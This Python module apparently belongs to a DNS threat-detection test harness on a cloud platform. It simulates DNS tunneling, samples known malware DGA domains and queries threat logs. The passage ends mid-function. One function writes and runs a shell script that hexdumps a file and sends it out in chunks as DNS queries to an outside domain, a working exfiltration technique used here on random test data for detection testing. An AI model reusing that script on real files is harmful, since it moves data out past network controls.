from typing import List, Dict
import logging

# Configure logger
logger = logging.getLogger(__name__)

def find_gcloud_path():
    """Find the gcloud executable path"""
    import shutil
    import os
    
    # Try common locations
    common_paths = [
        "/usr/local/bin/gcloud",
        "/opt/homebrew/bin/gcloud", 
        "/usr/bin/gcloud",
        os.path.expanduser("~/google-cloud-sdk/bin/gcloud"),
        "/snap/bin/gcloud"
    ]
    
    # First try using which/where
    gcloud_path = shutil.which("gcloud")
    if gcloud_path and os.path.isfile(gcloud_path):
        return gcloud_path
    
    # Try common paths
    for path in common_paths:
        if os.path.isfile(path) and os.access(path, os.X_OK):
            return path
    
    return "gcloud"  # Fallback to system PATH


def generate_dnst_data_exfiltration(domain: str = "ladytisiphone.com", anycast_ip: str = "") -> str:
    """
    Generate DNS tunneling (DNST) test data for threat detection.
    Based on the dnst_detector.py approach but integrated for category analysis.
    
    Args:
        domain (str): Domain to use for DNS tunneling simulation (default: ladytisiphone.com)
        anycast_ip (str): Anycast IP to use for DNS queries (empty for default)
        
    Returns:
        str: The generated DNST domain used for tunneling (base domain for threat correlation)
    """
    import random
    import subprocess
    import os
    
    try:
        logger.info(f"🔧 Generating DNST (DNS Tunneling) test data for domain: {domain}")
        
        # Create data file to use for tunneling detection
        subprocess.getstatusoutput('rm -rf test_exfiltration.txt domain_add.sh')
        
        # Generate random test data for exfiltration
        data_file = open("test_exfiltration.txt", "w+")
        for i in range(120):
            data_file.write(
                ''.join(random.choice('01234567890abcdefghijklmnopqrstuvwxyz!@#$%^*') for i in range(16)) + "\n")
        data_file.close()
        
        # Generate random identifiers for the tunneling session
        rand_chars = ''.join(random.choice('01234567890abcdefghijklmnopqrstuvwxyz') for i in range(8))
        rand_alphnum = ''.join(random.choice('01234567890abcdefghijklmnopqrstuvwxyz') for i in range(10))
        
        # Construct DNST domain names
        domain_start = str(rand_chars) + '.txt.0.start.scr.' + str(rand_alphnum) + '.' + domain
        domain_stop = str(rand_chars) + '.txt.0.stop.scr.' + str(rand_alphnum) + '.' + domain
        dnst_domain = str(rand_chars) + '.scr.' + str(rand_alphnum) + '.' + domain
        
        # The threat event will contain the base DNST domain (without the random prefix)
        # Example: full query is "vj3ljema.scr.r3kwv100xw.ladytisiphone.com"
        # but threat indicator will be "scr.r3kwv100xw.ladytisiphone.com"
        threat_base_domain = 'scr.' + str(rand_alphnum) + '.' + domain
        
        # Create exfiltration script
        fh = open("domain_add.sh", "w+")
        data = f'if [ ! -e "test_exfiltration.txt" ]; then echo "File does not exists"; else i=0;host -t A ' \
               f'646e735f31302e747874.1.{domain_start} {anycast_ip}; hexdump -e \'27/1 "%02x" "\\n"\' ' \
               f'"test_exfiltration.txt" | (while read line; do host -t A $line"."$i".{dnst_domain}" {anycast_ip};i=$(($i+1)) ' \
               f'; done ; host -t A 646e735f31302e747874.1.{domain_stop} {anycast_ip}; echo \'Segments sent: \' ' \
               f'$i); fi'
        fh.write(data)
        fh.close()
        
        # Execute the DNST simulation
        logger.info(f"🚀 Executing DNST simulation for domain: {dnst_domain}")
        logger.info(f"🎯 Expected threat indicator domain: {threat_base_domain}")
        result = subprocess.call(['sh', './domain_add.sh'])
        
        # Cleanup temporary files
        try:
            os.remove('test_exfiltration.txt')
            os.remove('domain_add.sh')
        except:
            pass
        
        logger.info(f"✅ DNST simulation completed.")
        logger.info(f"   Full query domain: {dnst_domain}")
        logger.info(f"   Threat indicator: {threat_base_domain}")
        
        # Return the threat base domain for accurate threat log correlation
        return threat_base_domain
        
    except Exception as e:
        logger.error(f"❌ Error generating DNST data: {e}")
        return f"error.{domain}"


def generate_dga_domains(count: int = 10, seed: str = "test") -> List[str]:
    """
    Generate Domain Generation Algorithm (DGA) domains for testing.
    Uses actual DGA domains from known malware families instead of generating random ones.
    
    Args:
        count (int): Number of DGA domains to return (will sample from available domains)
        seed (str): Seed for domain selection (used for reproducible sampling)
        
    Returns:
        List[str]: List of actual DGA domains from malware families
    """
    import random
    import hashlib
    from datetime import datetime
    
    try:
        logger.info(f"🔧 Selecting {count} DGA domains from known malware families")
        
        # Actual DGA domains from known malware families
        
        # DGA Mylobot domains (original format with m prefix)
        mylobot_domains = [
            "m14.jospife.ru",
            "m0.qnbwqfs.com", 
            "m41.kumswgx.net",
            "m11.puhurku.net",
            "m37.carscwa.net",
            "m38.qwaecal.ru",
            "m12.hktjdxi.net",
            "m0.scnixpn.com",
            "m27.udtlxsc.ru",
            "m10.efjybch.com",
            "m35.bwuskfu.net",
            "m9.bglixqu.com",
            "m25.bqeaeqq.net",
            "m0.zbrtimi.net",
            "m11.liewxwx.com"
        ]
        
        # DGA Suppobox domains
        suppobox_domains = [
            "viewserve.ru",
            "sylvestercherokee.ru",
            "radclyffeannabeth.net",
            "severalgeneral.ru"
        ]
        
        # Combine all DGA domains
        all_dga_domains = mylobot_domains + suppobox_domains
        
        # Use seed for reproducible selection
        date_seed = datetime.now().strftime("%Y%m%d") + seed
        random.seed(hashlib.md5(date_seed.encode()).hexdigest())
        
        # Sample domains based on requested count
        if count >= len(all_dga_domains):
            selected_domains = all_dga_domains
            logger.info(f"✅ Selected all {len(all_dga_domains)} available DGA domains")
        else:
            selected_domains = random.sample(all_dga_domains, count)
            logger.info(f"✅ Selected {len(selected_domains)} DGA domains from {len(all_dga_domains)} available")
        
        logger.info(f"🎯 DGA domains selected for DNS queries:")
        for i, domain in enumerate(selected_domains, 1):
            logger.info(f"   {i:2}. {domain}")
        
        logger.info(f"ℹ️  Note: Mylobot domains will appear in threat events without 'm##.' prefix")
        logger.info(f"    Example: m14.jospife.ru → jospife.ru in threat events")
        
        return selected_domains
        
    except Exception as e:
        logger.error(f"❌ Error selecting DGA domains: {e}")
        return []


def get_expected_threat_domains_from_dga(dga_domains: List[str]) -> List[str]:
    """
    Convert DGA domains to their expected format in threat events.
    Mylobot domains drop the first 3 characters (m##.) in threat events.
    
    Args:
        dga_domains (List[str]): Original DGA domains used for DNS queries
        
    Returns:
        List[str]: Expected domain formats in threat events
    """
    expected_domains = []
    
    for domain in dga_domains:
        if domain.startswith('m') and '.' in domain:
            # Mylobot format: m##.domain.tld → domain.tld
            parts = domain.split('.', 1)
            if len(parts) > 1 and len(parts[0]) == 3 and parts[0][0] == 'm':
                expected_domain = parts[1]  # Remove m##. prefix
                expected_domains.append(expected_domain)
                logger.debug(f"🔄 Mylobot mapping: {domain} → {expected_domain}")
            else:
                expected_domains.append(domain)
        else:
            # Suppobox and other formats remain the same
            expected_domains.append(domain)
    
    return expected_domains


"""
GCP Utilities for Category Analysis

Handles GCP operations including Cloud Logging queries and DNS log analysis.
This is a complete version with all functions needed for category analysis.
"""

import os
import sys
import json
import logging
import subprocess
import requests
from datetime import datetime, timedelta
from typing import List, Dict, Optional

logger = logging.getLogger(__name__)


def get_vm_metadata() -> Dict[str, str]:
    """
    Dynamically get VM metadata from GCP metadata server.
    This function runs on the VM and retrieves its own metadata.
    
    Returns:
        Dict[str, str]: VM metadata including instance_id, project_id, zone, name
    """
    metadata = {}
    
    try:
        # GCP metadata server URL
        metadata_server_url = "http://metadata.google.internal/computeMetadata/v1"
        headers = {"Metadata-Flavor": "Google"}
        timeout = 5  # 5 second timeout
        
        logger.info("🔍 Detecting VM metadata from GCP metadata server...")
        
        # Get project ID
        try:
            response = requests.get(
                f"{metadata_server_url}/project/project-id", 
                headers=headers, 
                timeout=timeout
            )
            if response.status_code == 200:
                metadata['project_id'] = response.text.strip()
                logger.info(f"✅ Project ID: {metadata['project_id']}")
        except Exception as e:
            logger.warning(f"⚠️  Could not get project ID: {e}")
        
        # Get instance ID (numeric)
        try:
            response = requests.get(
                f"{metadata_server_url}/instance/id", 
                headers=headers, 
                timeout=timeout
            )
            if response.status_code == 200:
                metadata['instance_id'] = response.text.strip()
                logger.info(f"✅ Instance ID: {metadata['instance_id']}")
        except Exception as e:
            logger.warning(f"⚠️  Could not get instance ID: {e}")
        
        # Get instance name
        try:
            response = requests.get(
                f"{metadata_server_url}/instance/name", 
                headers=headers, 
                timeout=timeout
            )
            if response.status_code == 200:
                metadata['name'] = response.text.strip()
                logger.info(f"✅ Instance Name: {metadata['name']}")
        except Exception as e:
            logger.warning(f"⚠️  Could not get instance name: {e}")
        
        # Get zone
        try:
            response = requests.get(
                f"{metadata_server_url}/instance/zone", 
                headers=headers, 
                timeout=timeout
            )
            if response.status_code == 200:
                # Zone comes as projects/{project}/zones/{zone}, extract just the zone
                zone_full = response.text.strip()
                metadata['zone'] = zone_full.split('/')[-1]
                logger.info(f"✅ Zone: {metadata['zone']}")
        except Exception as e:
            logger.warning(f"⚠️  Could not get zone: {e}")
        
        # Derive region from zone
        if 'zone' in metadata:
            # Region is zone minus the last part (e.g., africa-south1-a -> africa-south1)
            zone_parts = metadata['zone'].rsplit('-', 1)
            if len(zone_parts) > 1:
                metadata['region'] = zone_parts[0]
                logger.info(f"✅ Region: {metadata['region']}")
        
        # Validate we got the essential information
        required_fields = ['project_id', 'instance_id', 'zone', 'name']
        missing_fields = [field for field in required_fields if field not in metadata]
        
        if missing_fields:
            logger.error(f"❌ Missing required VM metadata fields: {missing_fields}")
            logger.error("   This script must run on a GCP VM with metadata server access")
            return {}
        
        logger.info("✅ VM metadata detection successful!")
        return metadata
        
    except Exception as e:
        logger.error(f"❌ Failed to get VM metadata from GCP metadata server: {e}")
        logger.error("   This script must run on a GCP VM with metadata server access")
        return {}


def get_vm_metadata_with_gcloud_fallback() -> Dict[str, str]:
    """
    Get VM metadata with fallback to gcloud commands if metadata server fails.
    
    Returns:
        Dict[str, str]: VM metadata including instance_id, project_id, zone, name
    """
    # Try metadata server first
    metadata = get_vm_metadata()
    if metadata:
        return metadata
    
    logger.info("🔄 Metadata server failed, trying gcloud commands as fallback...")
    
    try:
        # Fallback: use gcloud to get current project and instance info
        metadata = {}
        
        # Get current project
        try:
            result = subprocess.run(
                ["gcloud", "config", "get-value", "project"], 
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0 and result.stdout.strip():
                metadata['project_id'] = result.stdout.strip()
                logger.info(f"✅ Project ID (gcloud): {metadata['project_id']}")
        except Exception as e:
            logger.warning(f"⚠️  Could not get project via gcloud: {e}")
        
        # Get current VM info by querying the instance we're running on
        # This is trickier - we need to determine which instance we are
        try:
            # Get hostname first
            hostname_result = subprocess.run(
                ["hostname"], capture_output=True, text=True, timeout=5
            )
            if hostname_result.returncode == 0:
                hostname = hostname_result.stdout.strip()
                logger.info(f"📍 Hostname: {hostname}")
                
                # Try to find this instance in the current project
                if 'project_id' in metadata:
                    list_result = subprocess.run([
                        "gcloud", "compute", "instances", "list",
                        f"--project={metadata['project_id']}",
                        "--format=json",
                        f"--filter=name:{hostname}"
                    ], capture_output=True, text=True, timeout=30)
                    
                    if list_result.returncode == 0:
                        instances = json.loads(list_result.stdout)
                        if instances:
                            instance = instances[0]
                            metadata['name'] = instance.get('name', hostname)
                            metadata['instance_id'] = str(instance.get('id', ''))
                            zone_url = instance.get('zone', '')
                            if zone_url:
                                metadata['zone'] = zone_url.split('/')[-1]
                                # Derive region
                                zone_parts = metadata['zone'].rsplit('-', 1)
                                if len(zone_parts) > 1:
                                    metadata['region'] = zone_parts[0]
                            
                            logger.info(f"✅ Instance info via gcloud: {metadata}")
        except Exception as e:
            logger.warning(f"⚠️  Could not get instance info via gcloud: {e}")
        
        if not metadata:
            logger.error("❌ Could not determine VM metadata via any method")
            return {}
        
        return metadata
        
    except Exception as e:
        logger.error(f"❌ Gcloud fallback also failed: {e}")
        return {}


def fetch_dns_logs(project_id: str, vm_instance_id: str, vm_zone: str, 
                   hours_back: float = 2.0, max_entries: int = 5000, 
                   domains: List[str] = None, start_time: datetime = None, 
                   end_time: datetime = None) -> List[Dict]:
    """
    Fetch DNS query logs from GCP Cloud Logging.
    Collects actual DNS queries from dns_query resource type.
    
    Args:
        project_id (str): GCP project ID to query logs from  
        vm_instance_id (str): VM instance ID to filter logs
        vm_zone (str): VM zone name to filter logs
        hours_back (float): How many hours back to search for logs
        max_entries (int): Maximum number of log entries to retrieve
        domains (List[str]): List of domains to filter DNS queries
        start_time (datetime): Start time for log search (overrides hours_back)
        end_time (datetime): End time for log search
        
    Returns:
        List[Dict]: List of processed DNS query logs
    """
    try:
        # Check if gcloud is available
        try:
            subprocess.run(["gcloud", "version"], capture_output=True, text=True, timeout=10, check=True)
        except (FileNotFoundError, subprocess.CalledProcessError) as e:
            logger.error(f"❌ gcloud CLI not available for log querying: {e}")
            return []
        
        # Calculate time range
        if start_time and end_time:
            start_timestamp = start_time.strftime('%Y-%m-%dT%H:%M:%SZ')
            end_timestamp = end_time.strftime('%Y-%m-%dT%H:%M:%SZ')
        else:
            end_time_calc = datetime.utcnow()
            start_time_calc = end_time_calc - timedelta(hours=hours_back)
            start_timestamp = start_time_calc.strftime('%Y-%m-%dT%H:%M:%SZ')
            end_timestamp = end_time_calc.strftime('%Y-%m-%dT%H:%M:%SZ')
        
        logger.info(f"🔍 Querying DNS query logs from project: {project_id}")
        logger.info(f"🎯 VM Instance ID: {vm_instance_id}")
        logger.info(f"🎯 VM Zone: {vm_zone}")
        logger.info(f"⏰ Time range: {start_timestamp} to {end_timestamp}")
        logger.info(f"📊 Max entries: {max_entries}")
        
        if domains:
            logger.info(f"🎯 Will filter DNS logs for {len(domains)} specific domains")
            
        # Build precise GCP Cloud Logging filter for DNS query logs
        log_filter = f'''resource.type="dns_query"
jsonPayload.vmInstanceId="{vm_instance_id}"
timestamp>="{start_timestamp}"
timestamp<="{end_timestamp}"'''

        # Add specific domain filter if we have domains to search for
        if domains:
            domain_conditions = []
            for domain in domains:
                # For DNST domains (containing 'scr.' pattern), use wildcard matching
                if 'scr.' in domain.lower() or 'ladytisiphone' in domain.lower():
                    # Use regex pattern to match subdomains of DNST base domains
                    # This will match queries like "*.scr.r3kwv100xw.ladytisiphone.com"
                    domain_conditions.append(f'jsonPayload.queryName=~"{domain}"')
                    domain_conditions.append(f'jsonPayload.queryName=~"{domain}\\."')
                    # Also add contains matching for broader coverage
                    domain_conditions.append(f'jsonPayload.queryName:"{domain}"')
                else:
                    # For other domains, use exact matching as before
                    domain_conditions.append(f'jsonPayload.queryName="{domain}"')
                    domain_conditions.append(f'jsonPayload.queryName="{domain}."')
            
            if domain_conditions:
                domain_filter = " OR ".join(domain_conditions)
                log_filter += f'\n({domain_filter})'
        
        logger.info(f"🔍 DNS query log filter:")
        for line in log_filter.strip().split('\n'):
            logger.info(f"   {line}")
        
        # Execute gcloud logging command
        gcloud_cmd = [
            'gcloud', 'logging', 'read',
            log_filter,
            '--project', project_id,
            '--limit', str(max_entries),
            '--format', 'json',
            '--quiet'
        ]
        
        result = subprocess.run(gcloud_cmd, capture_output=True, text=True, timeout=120)
        
        if result.returncode != 0:
            logger.error(f"❌ gcloud logging command failed with error: {result.stderr}")
            return []
        
        try:
            logs = json.loads(result.stdout)
            if not logs:
                logger.info("ℹ️ No DNS query logs found for the specified criteria")
                return []
        except json.JSONDecodeError as e:
            logger.error(f"❌ Failed to parse gcloud logging output as JSON: {e}")
            return []
        
        logger.info(f"✅ Retrieved {len(logs)} DNS query log entries")
        
        # Filter logs by domains if specified
        if domains:
            filtered_logs = []
            for log in logs:
                query_name = log.get('jsonPayload', {}).get('queryName', '').rstrip('.')
                if query_name:
                    # Enhanced matching for different domain types
                    match_found = False
                    for domain in domains:
                        domain_clean = domain.lower().rstrip('.')
                        query_clean = query_name.lower()
                        
                        # For DNST domains, check if query ends with the base domain
                        if 'scr.' in domain_clean or 'ladytisiphone' in domain_clean:
                            if query_clean.endswith(domain_clean):
                                match_found = True
                                break
                        # For other domains, use exact or contains matching
                        elif (domain_clean in query_clean or query_clean in domain_clean):
                            match_found = True
                            break
                    
                    if match_found:
                        filtered_logs.append(log)
            
            logger.info(f"🎯 Found {len(filtered_logs)} DNS query logs matching our domains")
            return filtered_logs
        
        return logs
        
    except subprocess.TimeoutExpired:
        logger.error(f"❌ Timeout occurred while querying DNS logs")
        return []
    except Exception as e:
        logger.error(f"❌ Error fetching DNS logs: {str(e)}")
        return []


def fetch_threat_detection_logs(project_id: str, vm_instance_id: str, vm_zone: str, 
                               hours_back: float = 2.0, max_entries: int = 5000, 
                               threat_id: str = None, domains: List[str] = None,
                               start_time: datetime = None, end_time: datetime = None,
                               domain_mapping: Dict[str, str] = None) -> List[Dict]:
    """
    Fetch DNS threat detection logs from GCP Cloud Logging.
    Collects actual threat detection events from NetworkSecurity DnsThreatDetector.
    
    Args:
        project_id (str): GCP project ID to query logs from  
        vm_instance_id (str): VM instance ID to filter logs
        vm_zone (str): VM zone name to filter logs
        hours_back (float): How many hours back to search for logs
        max_entries (int): Maximum number of log entries to retrieve
        threat_id (str): Specific threat ID to filter by (e.g., "Malicious_Generic", "Phishing")
        domains (List[str]): List of threat indicator domains to analyze against
        start_time (datetime): Start time for log search (overrides hours_back)
        end_time (datetime): End time for log search
        domain_mapping (Dict[str, str], optional): Mapping of query domains to expected threat domains
        
    Returns:
        List[Dict]: List of processed threat detection logs
    """
    try:
        # Check if gcloud is available
        try:
            subprocess.run(["gcloud", "version"], capture_output=True, text=True, timeout=10, check=True)
        except (FileNotFoundError, subprocess.CalledProcessError) as e:
            logger.error(f"❌ gcloud CLI not available for log querying: {e}")
            return []
        
        # Calculate time range
        if start_time and end_time:
            start_timestamp = start_time.strftime('%Y-%m-%dT%H:%M:%SZ')
            end_timestamp = end_time.strftime('%Y-%m-%dT%H:%M:%SZ')
        else:
            end_time_calc = datetime.utcnow()
            start_time_calc = end_time_calc - timedelta(hours=hours_back)
            start_timestamp = start_time_calc.strftime('%Y-%m-%dT%H:%M:%SZ')
            end_timestamp = end_time_calc.strftime('%Y-%m-%dT%H:%M:%SZ')
        
        logger.info(f"🔍 Querying DNS threat detection logs from project: {project_id}")
        logger.info(f"🎯 VM Instance ID: {vm_instance_id}")
        logger.info(f"🎯 VM Zone: {vm_zone}")
        logger.info(f"⏰ Time range: {start_timestamp} to {end_timestamp}")
        logger.info(f"📊 Max entries: {max_entries}")
        
        if threat_id:
            logger.info(f"🎯 Will filter for threat ID: {threat_id}")
        elif domains:
            logger.info(f"🎯 Will analyze threats for {len(domains)} specific domains")
            
        # Build precise GCP Cloud Logging filter for DNS threat detection logs
        log_filter = f'''resource.type="networksecurity.googleapis.com/DnsThreatDetector"
jsonPayload.dnsQuery.vmInstanceId="{vm_instance_id}"
timestamp>="{start_timestamp}"
timestamp<="{end_timestamp}"'''

        # Add threat ID filter if specified (preferred method for category analysis)
        if threat_id:
            if threat_id == "Phishing":
                threat_filter = 'jsonPayload.threatInfo.threatId="Phishing"'
            elif threat_id == "DNST":
                # For DNST, filter by threat type like in e2e_utils.py
                threat_filter = 'jsonPayload.threatInfo.threat="TI-DNST"'
            else:
                threat_filter = f'jsonPayload.threatInfo.threatId="{threat_id}"'
            log_filter += f"\n{threat_filter}"
        
        # Add specific domain filter if we have domains to search for
        elif domains:
            domain_conditions = []
            # Use both original domains and any mapped threat domains
            domains_to_search = set(domains)  # Start with original domains
            
            # Add mapped threat domains if domain_mapping is provided
            if domain_mapping:
                for query_domain in domains:
                    if query_domain in domain_mapping:
                        threat_domain = domain_mapping[query_domain]
                        domains_to_search.add(threat_domain)
                        logger.info(f"🔄 Domain mapping: {query_domain} → {threat_domain}")
            
            # Build query conditions for all domains
            for domain in domains_to_search:
                # Standard query name filters
                domain_conditions.append(f'jsonPayload.dnsQuery.queryName="{domain}"')
                domain_conditions.append(f'jsonPayload.dnsQuery.queryName="{domain}."')
                # Also check threat indicator field for DNST and other threats
                domain_conditions.append(f'jsonPayload.threatInfo.threatIndicator="{domain}"')
                domain_conditions.append(f'jsonPayload.threatInfo.threatIndicator="{domain}."')
            
            if domain_conditions:
                domain_filter = " OR ".join(domain_conditions)
                log_filter += f'\n({domain_filter})'
        
        logger.info(f"🔍 DNS threat detection log filter:")
        for line in log_filter.strip().split('\n'):
            logger.info(f"   {line}")
        
        # Construct gcloud logging read command
        gcloud_command = [
            "gcloud", "logging", "read",
            log_filter,
            f"--project={project_id}",
            f"--limit={max_entries}",
            "--format=json"
        ]
        
        # Execute the gcloud command
        result = subprocess.run(
            gcloud_command,
            capture_output=True,
            text=True,
            timeout=120  # 2 minutes timeout
        )
        
        if result.returncode != 0:
            logger.error(f"❌ Error querying threat detection logs: {result.stderr}")
            return []
        
        if not result.stdout.strip():
            logger.info("ℹ️ No threat detection logs found for the specified criteria")
            return []
        
        # Parse the JSON response
        raw_logs = json.loads(result.stdout)
        logger.info(f"✅ Retrieved {len(raw_logs)} threat detection log entries")
        
        # Process threat detection log entries
        dns_logs = []
        threat_matches = 0
        
        for entry in raw_logs:
            try:
                # Extract threat detection information
                json_payload = entry.get('jsonPayload', {})
                dns_query = json_payload.get('dnsQuery', {})
                threat_info = json_payload.get('threatInfo', {})
                
                query_name = dns_query.get('queryName', '').rstrip('.')
                threat_id_found = threat_info.get('threatId', '')
                threat_feed = threat_info.get('threatFeed', '')
                
                if query_name:
                    dns_log = {
                        'timestamp': entry.get('timestamp', ''),
                        'query_name': query_name,
                        'threat_id': threat_id_found,
                        'threat_feed': threat_feed,
                        'vm_instance_id': dns_query.get('vmInstanceId', ''),
                        'source_ip': dns_query.get('sourceIP', ''),
                        'query_type': dns_query.get('queryType', ''),
                        'response_code': dns_query.get('responseCode', ''),
                        'raw_entry': entry
                    }
                    dns_logs.append(dns_log)
                    threat_matches += 1
                
            except Exception as e:
                logger.warning(f"Error processing threat detection log entry: {e}")
                continue
        
        logger.info(f"🎯 Found {threat_matches} threat detection events matching our criteria")
        return dns_logs
        
    except subprocess.CalledProcessError as e:
        logger.error(f"❌ Error executing gcloud command: {e}")
        return []
    except json.JSONDecodeError as e:
        logger.error(f"❌ Error parsing JSON response: {e}")
        return []
    except Exception as e:
        logger.error(f"💥 Unexpected error querying threat detection logs: {e}")
        return []


def extract_unique_domains_from_threats(threat_logs: List[Dict]) -> List[str]:
    """
    Extract unique domain names from threat detection logs.
    
    Args:
        threat_logs (list): List of threat detection log entries
        
    Returns:
        list: List of unique domain names from threats
    """
    unique_domains = set()
    
    for log_entry in threat_logs:
        try:
            query_name = log_entry.get('query_name', '')
            if query_name:
                # Remove trailing dot and convert to lowercase for consistency
                domain = query_name.rstrip('.').lower()
                # Skip empty domains and internal/system domains
                if domain and not any(excluded in domain for excluded in ['internal', 'local', 'googleapis']):
                    unique_domains.add(domain)
                
        except Exception as e:
            logger.warning(f"Error extracting domain from threat log: {e}")
            continue
    
    return sorted(list(unique_domains))


def extract_unique_domains_from_dns_logs(dns_logs: List[Dict]) -> List[str]:
    """
    Extract unique domain names from DNS query logs (separate from threat logs).
    This function processes the actual DNS query logs to find distinct domains queried.
    
    Args:
        dns_logs (list): List of DNS query log entries
        
    Returns:
        list: List of unique domain names from DNS queries
    """
    unique_domains = set()
    
    for log_entry in dns_logs:
        try:
            # Try different possible paths for domain name in log structure
            query_name = None
            
            # Check if it's a threat detection log structure
            if 'query_name' in log_entry:
                query_name = log_entry.get('query_name', '')
            
            # Check if it's a standard DNS log structure with jsonPayload
            elif 'jsonPayload' in log_entry:
                json_payload = log_entry.get('jsonPayload', {})
                # First check if queryName is directly in jsonPayload (DNS logs)
                if 'queryName' in json_payload:
                    query_name = json_payload.get('queryName', '')
                else:
                    # Fall back to dnsQuery structure for other log formats
                    dns_query = json_payload.get('dnsQuery', {})
                    query_name = dns_query.get('name') or dns_query.get('queryName', '')
            
            # Check if it's a simple structure with direct domain field
            elif 'domain' in log_entry:
                query_name = log_entry.get('domain', '')
            
            # Check if it's in the root level as 'name' or 'queryName'
            elif 'name' in log_entry:
                query_name = log_entry.get('name', '')
            elif 'queryName' in log_entry:
                query_name = log_entry.get('queryName', '')
            
            if query_name:
                # Remove trailing dot and convert to lowercase for consistency
                domain = query_name.rstrip('.').lower()
                # Skip empty domains and internal/system domains
                if domain and not any(excluded in domain for excluded in ['internal', 'local', 'googleapis']):
                    unique_domains.add(domain)
                
        except Exception as e:
            logger.warning(f"Error extracting domain from DNS log: {e}")
            continue
    
    return sorted(list(unique_domains))


def run_ssh_command(project_id: str, vm_name: str, zone: str, command: str, timeout: int = 30) -> tuple:
    """
    Execute a command on a GCP VM via SSH using IAP tunneling.
    
    Args:
        project_id (str): GCP project ID
        vm_name (str): VM instance name
        zone (str): GCP zone
        command (str): Command to execute
        timeout (int): Command timeout in seconds
        
    Returns:
        tuple: (exit_code, output)
    """
    try:
        # Construct gcloud compute ssh command with IAP tunneling
        ssh_command = [
            "gcloud", "compute", "ssh", vm_name,
            f"--project={project_id}",
            f"--zone={zone}",
            "--command", command,
            "--tunnel-through-iap",
            "--quiet"
        ]
        
        logger.info(f"🔧 SSH Command: {' '.join(ssh_command)}")
        logger.info(f"📡 Executing on {vm_name} via IAP: {command}")
        
        # Execute the command
        result = subprocess.run(
            ssh_command,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False
        )
        
        output = result.stdout + result.stderr if result.stderr else result.stdout
        logger.info(f"📋 SSH Response (exit {result.returncode}):")
        for line in output.split('\n'):
            if line.strip():
                logger.info(f"   {line}")
        
        return result.returncode, output
        
    except subprocess.TimeoutExpired:
        logger.error(f"⏰ SSH command timed out after {timeout} seconds")
        return 124, f"Command timed out after {timeout} seconds"
    except Exception as e:
        logger.error(f"❌ SSH command failed: {e}")
        return 1, str(e)


def test_ssh_connectivity(project_id: str, vm_name: str, zone: str) -> bool:
    """
    Test if SSH connectivity to the VM is available using IAP tunneling.
    
    Args:
        project_id (str): GCP project ID
        vm_name (str): VM instance name
        zone (str): GCP zone
        
    Returns:
        bool: True if SSH is available, False otherwise
    """
    try:
        logger.info(f"🔧 Testing SSH connectivity to {vm_name} via IAP tunneling...")
        
        ssh_test_command = [
            "gcloud", "compute", "ssh", vm_name,
            f"--project={project_id}",
            f"--zone={zone}",
            "--command", "echo 'SSH_TEST_OK'",
            "--tunnel-through-iap",
            "--quiet"
        ]
        
        logger.info(f"🔧 SSH test command: {' '.join(ssh_test_command)}")
        
        result = subprocess.run(
            ssh_test_command,
            capture_output=True,
            text=True,
            timeout=30,
            check=False
        )
        
        logger.info(f"🔧 SSH test result: exit_code={result.returncode}")
        if result.stdout:
            logger.info(f"🔧 SSH test stdout: {result.stdout.strip()}")
        if result.stderr:
            logger.info(f"🔧 SSH test stderr: {result.stderr.strip()}")
        
        if result.returncode == 0 and "SSH_TEST_OK" in result.stdout:
            logger.info("✅ SSH connectivity confirmed via IAP")
            return True
        else:
            logger.warning("⚠️ SSH connectivity test failed")
            return False
            
    except subprocess.TimeoutExpired:
        logger.warning("⚠️ SSH connectivity test timed out")
        return False
    except Exception as e:
        logger.warning(f"⚠️ SSH connectivity test failed: {e}")
        return False


def execute_ssh_dig_queries_batch(project_id: str, vm_name: str, zone: str, domains: List[str]) -> Dict[str, Dict]:
    """
    Execute dig queries on a GCP VM via SSH for multiple domains using batch processing.
    Processes domains in batches of 50 to optimize SSH connections and improve performance.
    
    Args:
        project_id (str): GCP project ID
        vm_name (str): VM instance name  
        zone (str): GCP zone
        domains (List[str]): List of domain names to query
        
    Returns:
        Dict[str, Dict]: Results indexed by domain name with query details
    """
    results = {}
    DNS_BATCH_SIZE = 50  # Define batch size locally
    
    try:
        logger.info(f"🚀 Starting batch dig queries on {vm_name}")
        logger.info(f"🎯 Querying {len(domains)} domains in batches of 50")
        
        # Test SSH connectivity first
        ssh_available = test_ssh_connectivity(project_id, vm_name, zone)
        
        if not ssh_available:
            logger.error("❌ SSH connectivity failed. Cannot execute dig queries.")
            logger.error("📝 Note: Ensure VM has SSH access and proper firewall rules.")
            return {}
        
        # Process domains in batches
        total_batches = (len(domains) + DNS_BATCH_SIZE - 1) // DNS_BATCH_SIZE
        
        for batch_num in range(total_batches):
            start_idx = batch_num * DNS_BATCH_SIZE
            end_idx = min(start_idx + DNS_BATCH_SIZE, len(domains))
            batch_domains = domains[start_idx:end_idx]
            
            logger.info(f"\n🔄 Processing batch {batch_num + 1}/{total_batches} ({len(batch_domains)} domains)")
            logger.info("-" * 60)
            
            # Create a single command that queries all domains in the batch
            dig_commands = []
            for domain in batch_domains:
                dig_commands.append(f"echo '=== {domain} ==='; dig +short {domain}; echo")
            
            # Combine all dig commands into a single SSH session
            batch_command = "; ".join(dig_commands)
            
            # Execute the batch command via SSH
            exit_code, output = run_ssh_command(project_id, vm_name, zone, batch_command, timeout=60)
            
            if exit_code == 0:
                # Parse the batch output
                batch_results = parse_batch_dig_output(output, batch_domains)
                results.update(batch_results)
                
                successful_in_batch = sum(1 for r in batch_results.values() if r['status'] == 'success')
                logger.info(f"✅ Batch {batch_num + 1}: {successful_in_batch}/{len(batch_domains)} queries successful")
                
            else:
                # If batch fails, fall back to individual queries for this batch
                logger.warning(f"⚠️ Batch {batch_num + 1} failed, falling back to individual queries")
                for domain in batch_domains:
                    try:
                        dig_command = f"dig +short {domain}"
                        exit_code_single, output_single = run_ssh_command(project_id, vm_name, zone, dig_command, timeout=15)
                        
                        if exit_code_single == 0:
                            lines = [line.strip() for line in output_single.split('\n') if line.strip()]
                            ip_addresses = [line for line in lines if '.' in line and not line.startswith(';')]
                            
                            results[domain] = {
                                'status': 'success',
                                'dig_command': dig_command,
                                'raw_response': output_single,
                                'ip_addresses': ip_addresses,
                                'response_count': len(ip_addresses),
                                'exit_code': exit_code_single
                            }
                        else:
                            results[domain] = {
                                'status': 'error',
                                'dig_command': dig_command,
                                'raw_response': output_single,
                                'error_message': f"dig command failed with exit code {exit_code_single}",
                                'exit_code': exit_code_single
                            }
                            
                    except Exception as e:
                        logger.error(f"❌ Error querying {domain}: {e}")
                        results[domain] = {
                            'status': 'exception',
                            'dig_command': f"dig +short {domain}",
                            'raw_response': '',
